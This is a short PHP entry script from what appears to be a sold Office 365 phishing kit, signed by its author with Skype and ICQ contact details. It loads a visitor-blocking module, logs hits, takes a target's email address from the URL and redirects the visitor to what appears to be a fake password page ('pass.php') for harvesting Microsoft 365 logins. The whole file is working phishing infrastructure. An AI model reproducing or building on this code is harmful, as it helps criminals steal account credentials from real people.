<?php
// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// OFFICE 365 Version 11
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
session_start();
require 'core/functions.php';
require 'core/blocker.php';

logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");
$email= base64_encode($_GET['email']);
if(!isset($_SESSION['email'])) {
    echo "<script>window.location = 'another.php?email={$email}';</script>";
    exit();
} else {
    echo "<script>window.location = 'pass.php?email={$_SESSION['email']}';</script>";
    exit();
}
?>